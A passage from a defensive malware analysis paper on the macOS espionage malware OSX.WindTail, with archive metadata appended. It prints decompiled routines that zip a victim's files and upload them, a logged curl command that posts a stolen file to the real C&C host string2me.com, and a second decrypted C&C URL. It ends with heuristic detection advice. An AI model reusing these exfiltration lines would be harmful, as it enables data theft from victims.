‘honk’):\n\n\n-----\n\n```\n(lldb) po $rdx\n<__NSArrayM 0x1001aafc0>(\n{\n  \"KEY_ATTR\" = {\n    NSFileCreationDate = \"2017-09-26 06:58:34 +0000\";\n    NSFileExtensionHidden = 0;\n    NSFileGroupOwnerAccountID = 0;\n    NSFileGroupOwnerAccountName = wheel;\n    NSFileHFSCreatorCode = 0;\n    NSFileHFSTypeCode = 0;\n    NSFileModificationDate = \"2017-09-26 07:01:34 +0000\";\n    NSFileOwnerAccountID = 0;\n    NSFileOwnerAccountName = root;\n    NSFilePosixPermissions = 420;\n    NSFileReferenceCount = 1;\n    NSFileSize = 57344;\n    NSFileSystemFileNumber = 890895;\n    NSFileSystemNumber = 16777218;\n    NSFileType = NSFileTypeRegular;\n  };\n  \"KEY_PATH\" = \"/Library/Application Support/com.apple.TCC/TCC.db\";\n},\n{\n  \"KEY_ATTR\" = {\n    NSFileCreationDate = \"2017-07-15 23:45:04 +0000\";\n    NSFileExtensionHidden = 0;\n    NSFileGroupOwnerAccountID = 0;\n    NSFileGroupOwnerAccountName = wheel;\n    NSFileHFSCreatorCode = 0;\n    NSFileHFSTypeCode = 0;\n    NSFileModificationDate = \"2017-07-15 23:45:04 +0000\";\n    NSFileOwnerAccountID = 0;\n    NSFileOwnerAccountName = root;\n    NSFilePosixPermissions = 384;\n    NSFileReferenceCount = 1;\n    NSFileSize = 272;\n    NSFileSystemFileNumber = 869137;\n    NSFileSystemNumber = 16777218;\n    NSFileType = NSFileTypeRegular;\n  };\n  \"KEY_PATH\" = \"/private/etc/racoon/psk.txt\";\n}\n)\n\n```\nFor each of the files that the ‘fist’ method added to the ‘honk’ array, the malware invokes a\nmethod, aptly named ‘zip’, and invokes macOS’s built-in zip utility to create an archive of\nthe file:\n\n\n-----\n\n```\n/ @class image /\n-(void)zip {\n  r14 = [@\"/tmp/\" stringByAppendingPathComponent:[rbx->m_filePath\n      lastPathComponent]];\n    ...\n  rax = [r14 stringByAppendingString:@\".zip\"];\n  ...\n  rax = (r14)(@class(NSArray), @selector(arrayWithObjects:), @\"/usr/bin/zip\",\n  *(rbx + r12), rbx->m_filePath, 0x0);\n  rax = (r14)(r15, @selector(initWithController:arguments:), rbx, rax);\n  *(rbx + r13) = rax;\n  (r14)(rax, @selector(startProcess), rbx);\n  return;\n}\n\n```\nThis may be passively observed via the ProcInfo [6] process monitoring utility (here, for\nexample, the zip archive is created from the file StopTemplate.pdf):\n```\n# ./procInfo\n[ process start]\npid: 1202\npath: /usr/bin/zip\nargs: (\n  \"/usr/bin/zip\",\n  \"/tmp/StopTemplate.pdf.zip\",\n  \"/Applications/Automator.app/Contents/Resources/StopTemplate.pdf\"\n)\n\n```\nOnce the file has been zipped up the malware invokes a method named ‘upload’:\n```\n/* @class image */\n-(void)upload {\n  ...\n  r14 = [tofg alloc];\n  if (r12->m_State == 0x1) {\n    var_30 = [@\"[email protected]\" stringByAppendingString:r12->m_tempPath];\n    [@\"od=\" stringByAppendingString:r12->m_ComputerName_UserName];\n    [@\"kl=\" stringByAppendingString:r12->cont];\n    r8 = var_30;\n    rax = [NSArray arrayWithObjects:@\"/usr/bin/curl\"]; rdx = r12;\n    rax = [r14 initWithController:rdx arguments:rax]; }\n  else {\n    rax = [NSArray arrayWithObjects:@\"/usr/bin/curl\"]; rcx = rax;\n    rax = [r14 initWithController:rdx arguments:rcx];\n  }\n  [rax startProcess];\n  return;\n}\n\n```\nReferences to ‘curl’ (/usr/bin/curl) in this method illustrate that the malware is exfiltrating the\nfiles by (ab)using this built-in network utility. This can be confirmed via ProcInfo [6] (which\nalso reveals the network endpoint\n‘string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php’):\n\n\n-----\n\n```\n# ./procInfo\n[ process start]\npid: 1258\npath: /usr/bin/curl\nuser: 501\nargs: (\n  \"/usr/bin/curl\",\n  \"-F\",\n  \"[email protected]/tmp/StopTemplate.pdf.zip\",\n  \"-F\",\n  \"od=1601201920543863\",\n  \"-F\",\n  \"kl=users-mac.lan-user\",\n  \"string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php\"\n)\n\n```\nThe man page for curl states that the ‘-F’ flag will post data, and when ‘@’ is specified, curl\nwill process the input as a file:\n```\n$ man curl\n...\n-F, --form <name=content>\n(HTTP) This lets curl emulate a filled-in form in which a user has pressed the\nsubmit button. This causes curl to POST data using the Content-Type\nmultipart/formdata according to RFC 2388. This enables uploading of binary files\netc. To force the 'content' part to be a file, prefix the file name with an @ sign.\nTo just get the content part from a file, prefix the file name with the symbol <.\nThe difference between @ and < is then that @ makes a file get attached in the post\nas a file upload, while the < makes a text field and just get the contents for that\ntext field from a file.\nExample: to send an image to a server, where 'profile' is the name of the formfield\nto which portrait.jpg will be the input:curl -F [email protected]\nhttps://example.com/upload.cgi\n\n```\nA Wireshark [7] capture also illustrates the exfiltration attempt to string2me.com (though the\nC&C server returned a 403 error), as shown in Figure 17.\n\n\n-----\n\nFigure 17: Exfiltration to string2me.com is attempted.\n\nThrough static and dynamic analysis, we illustrated OSX.WindTail’s ultimate goal: to\npersistently exfiltrate files (such as documents) to a remote server. This capability fits nicely\ninto an offensive cyber-espionage operation, such as the one orchestrated by the\nWINDSHIFT APT group.\n\n### OSX.WindTail: C&C servers\n\nAs noted, ProcInfo [6] and Wireshark observed the malware invoking curl to exfiltrate files to\nits command-and-control server, string2me.com.\n\nHowever this string does not appear in plaintext in the malware’s binary:\n```\n# grep string2me.com Final_Presentation.app/Contents/MacOS/usrnode | wc\n0 0 0\n\n```\nThis is unsurprising as malware authors often obfuscate or encrypt such strings to hinder\nanalysis.\n\nRecall that the malware invokes the ‘yoop’ method to decrypt embedded strings. By setting\na breakpoint on this method, one can observe the malware dynamically decrypting and\ndecoding strings.\n\nFor example, the malware’s ‘mydel’ method appears to attempt to connect to the attacker’s\nC&C servers. By waiting until (a debugged instance of) the malware invokes this method,\nthe addresses of the C&C servers can be recovered:\n\n\n-----\n\n```\n(lldb) x/s 0x0000000100350a40\n0x100350a40: \"string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php\n...\n(lldb) x/s 0x0000000100352fe0\n0x100352fe0: \"http://flux2key.com/liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php?\nvery=%@&xnvk=%@\n\n```\nThese C&C domains (string2me.com and flux2key.com) are both WINDSHIFT domains, as\nnoted by Karim in an interview with iTWire [8]: ‘... the domains string2me.com and\nflux2key.com identified as associated with these attacks.’\n\n_Note: Currently both C&C servers appear to be offline:_\n\n_$ ping flux2key.com_\n_ping: cannot resolve flux2key.com: Unknown host_\n_$ nslookup flux2key.com_\n_Server: 8.8.8.8_\n_Address: 8.8.8.8#53_\n_** server can’t find flux2key.com: SERVFAIL_\n\n### OSX.WindTail: self-delete logic\n\nLet’s briefly revisit the malware’s implementation of the ‘applicationDidFinishLaunching’\ndelegate method:\n```\n-(void)applicationDidFinishLaunching:(void *)arg2\n{\n   ...\n  [r15 tuffel];\n  [NSThread detachNewThreadSelector:@selector(mydel) toTarget:r15 withObject:0x0];\n}\n\n```\nNote that at the end, the malware spins off a new thread (via the\n‘detachNewThreadSelector’ method) to execute a method named ‘mydel’.\n\n\n-----\n\n```\n/ @class AppDelegate /\n-(void)mydel {\n  ...\n  r14 = [NSString stringWithFormat:@\"%@\", [self yoop:@\"F5Ur0CCFMO/\n  fWHjecxEqGLy/...\"]];\n  rbx = [[NSMutableURLRequest alloc] init];\n  [rbx setURL:[NSURL URLWithString:r14]];\n  ...\n  if ([[[NSString alloc] initWithData:[NSURLConnection sendSynchronousRequest:rbx\n    returningResponse:0x0 error:0x0] encoding:0x4] isEqualToString:@\"1\"] != 0x0)\n{\n      r14 = [NSFileManager defaultManager];\n      rdx = [[NSBundle mainBundle] bundlePath];\n      [r14 removeItemAtPath:rdx error:rcx];\n      [[NSApplication sharedApplication] terminate:0x0, rcx];\n  }\n  return;\n}\n\n```\nAs shown in the above decompilation, the ‘mydel’ method performs the following:\n\n1. Generates a URL request from an encrypted string.\n2. Makes a network request to this URL\n3. If the request returns a string that equals ‘1’:\n4. Deletes itself\n5. Terminates itself\n\n_Note: The encrypted string decrypts to a URL:_\n_http://flux2key.com/liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php?very=%@&xnvk=%@_\n\nThough this C&C server was offline at the time of analysis, if the server returns a ‘1’ the\nmalware will delete itself and then immediately terminate. It’s rather neat to see a ‘remotely\ntriggerable’ self-deletion capability built directly into the malware!\n\n### OSX.WindTail: detection\n\nWhen OSX.WindTail samples were submitted to VirusTotal, many of the specimens were\ninitially undetected, as shown in Figure 18.\n\n\n-----\n\nFigure 18: Most samples were initially undetected.\n\n_Note: It should be noted that for any particular AV engine (on VirusTotal), said engine may_\n_only be one (small?) piece of a more complete security product. That is to say, a company’s_\n_comprehensive security product may also include a behaviour-based engine (not included_\n_on VirusTotal) that perhaps could generically detect this new threat._\n\nAlthough OSX.WindTail is utilized by a fairly advanced APT group, in reality it is rather easy\nto detect, albeit via heuristics.\n\nFor example, by monitoring persistence events (such the programmatic installation of a\nlogin item) one may be able to detect the malware during its installation and persistence\nphase. In Figure 19, BlockBlock [9] detects OSX.WindTail’s persistence.\n\nFigure 19: BlockBlock proactively detects OSX.WindTail.\n\nOf course, a firewall product such as the free, open-source LuLu [10] would be able to\ndetect the malware’s unauthorized network connections (e.g. to its C&C server).\n\n\n-----\n\nOn a system that has been infected, a tool such as KnockKnock [11], that enumerates\npersistently installed software, can generically detect OSX.WindTail (and other persistence\nthreats as well), as shown in Figure 20.\n\nFigure 20: KnockKnock reactively detects OSX.WindTail.\n\nOne can also manually check for an infection by looking for a suspicious login item via the\n_System Preferences application, and/or for the presence of suspicious application in the_\n‘~/Library/’ folder (probably with a Microsoft Office icon, and perhaps an invalid code\nsignature). Deleting any such applications and login item will remove the malware.\n\n_Note: If an infection is uncovered (which is rather unlikely, unless you’re a government_\n_official in a specific Middle Eastern country), as is the case with any malware infection, it’s_\n_best to fully wipe your system and reinstall macOS._\n\n## Conclusion\n\nIt’s not every day that the Mac capabilities of an APT or ‘nation-state’ group are uncovered.\nHowever, OSX.WindTail (belonging to the WINDSHIFT APT group) provided an interesting\ncase study of such a tool.\n\nIn this paper, we comprehensively analysed OSX.WindTail, detailing its exploit vector,\ninstallation logic, method of persistence, and file extfiltration capabilities. Moreover, our\nresearch discussed decryption routines to uncover addresses of the malware’s C&C servers\nand highlighted its remote self-delete logic.\n\nTo conclude, we presented heuristic methods of detection that can generically detect\nOSX.WindTail, as well as other advanced macOS threats. Our hope is that such detection\nmethods will become more widely and generically adopted in security tools and thus, that\n_Mac users will remain safe and secure._\n\n## References\n\n\n-----\n\n[1] Karm, T. In the Trails of WindShift APT. Hack in the Box GSEC.\nhttps://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf.\n\n[2] Brewster, T. Hackers Are Exposing An Apple Mac Weakness In Middle East Espionage.\nForbes. August 2018. https://www.forbes.com/sites/thomasbrewster/2018/08/30/apple-macloophole-breached-in-middle-east-hacks/#36d3c3b06fd6.\n\n[3] Wardle, P. Click File, App Opens. Objective-See. August 2016. https://objectivesee.com/blog/blog_0x12.html.\n\n[4] Apple Developer Documentation. Information Property List Key Reference.\nhttps://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyR\n[eference/Articles/CoreFoundationKeys. html#//apple_ref/doc/uid/20001431-101685.](https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail/%20html#//apple_ref/doc/uid/20001431-101685)\n\n[5] Apple Developer Documentation. applicationDidFinishLaunching:.\nhttps://developer.apple.com/documentation/appkit/nsapplicationdelegate/1428385applicationdidfinishlaunching?language=objc.\n\n[6] ProcInfo, Process Monitor. https://github.com/objectivesee/ProcInfo/tree/master/procInfo.\n\n[7] WireShark. [https://www.wireshark.org/.](https://www.wireshark.org/)\n\n[8] Varghese, S. Researcher unsure if Apple has acted to curb malware. iTWire. September\n2018. https://www.itwire.com/security/84324-researcher-unsure-if-apple-has-actedto-curbmalware.html.\n\n[9] BlockBlock. [https://objective-see.com/products/blockblock.html.](https://objective-see.com/products/blockblock.html)\n\n[10] LuLu. [https://objective-see.com/products/lulu.html.](https://objective-see.com/products/lulu.html)\n\n[11] KnockKnock. [https://objective-see.com/products/knockknock.html.](https://objective-see.com/products/knockknock.html)\n\n## Latest articles:\n\n### Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency\n\nTeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order\nto infiltrate organizations’ dedicated environments and transform them into attack\nlaunchpads. In this article Aditya Sood presents a new module introduced by…\n\n\n-----\n\n### Collector-stealer: a Russian origin credential and information extractor\n\nCollector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to\nexfiltrate sensitive data from end-user systems and store it in its C&C panels. In this article,\nresearchers Aditya K Sood and Rohit Chaturvedi present a 360…\n\n### Fighting Fire with Fire\n\nIn 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and\nfrom that moment onward, was intrigued by the properties of these small pieces of selfreplicating code. Joe Wells was an expert on computer viruses, was partly…\n\n### Run your malicious VBA macros anywhere!\n\nKurt Natvig wanted to understand whether it’s possible to recompile VBA macros to another\nlanguage, which could then easily be ‘run’ on any gateway, thus revealing a sample’s true\nnature in a safe manner. In this article he explains how he recompiled…\n\n### Dissecting the design and vulnerabilities in AZORult C&C panels\n\nAditya K Sood looks at the command-and-control (C&C) design of the AZORult malware,\ndiscussing his team's findings related to the C&C design and some security issues they\nidentified during the research.\n\n[Bulletin Archive](https://www.virusbulletin.com/virusbulletin/archive)\n\nWe have placed cookies on your device in order to improve the functionality of this site, as\n[outlined in our cookies policy. However, you may delete and block all cookies from this site](https://www.virusbulletin.com/about-vb/privacy-policy/cookies)\nand your use of the site will be unaffected. By continuing to browse this site, you are\n[agreeing to Virus Bulletin's use of data as outlined in our privacy policy.](https://www.virusbulletin.com/about-vb/privacy-policy/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-12 - Cyber espionage in the Middle East- unravelling OSX.WindTail.pdf"
    ],
    "report_names": [
        "2019-12-12 - Cyber espionage in the Middle East- unravelling OSX.WindTail.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6bd4ed50-e116-494c-bb70-9587876663f1",
            "created_at": "2023-01-06T13:46:39.004062Z",
            "updated_at": "2025-03-27T02:00:02.974882Z",
            "deleted_at": null,
            "main_name": "WindShift",
            "aliases": [
                "Windy Phoenix"
            ],
            "source_name": "MISPGALAXY:WindShift",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ada9e5d3-1cb2-4b70-a3c8-96808c304ac8",
            "created_at": "2022-10-25T15:50:23.6515Z",
            "updated_at": "2025-03-27T02:00:55.513513Z",
            "deleted_at": null,
            "main_name": "Windshift",
            "aliases": [
                "Windshift",
                "Bahamut"
            ],
            "source_name": "MITRE:Windshift",
            "tools": [
                "WindTail"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "68f12936-2361-4720-87e1-b79a4fdbf1a0",
            "created_at": "2022-10-25T16:07:24.409855Z",
            "updated_at": "2025-03-27T02:02:10.21199Z",
            "deleted_at": null,
            "main_name": "WindShift",
            "aliases": [
                "Windy Phoenix"
            ],
            "source_name": "ETDA:WindShift",
            "tools": [
                "WindTail"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535838,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787379,
    "ts_modification_date": 1653787379,
    "files": {
        "pdf": "https://archive.orkl.eu/c7a15e28eefa223b2845c351ed7fb7821c8de74f.pdf",
        "text": "https://archive.orkl.eu/c7a15e28eefa223b2845c351ed7fb7821c8de74f.txt",
        "img": "https://archive.orkl.eu/c7a15e28eefa223b2845c351ed7fb7821c8de74f.jpg"
    }
}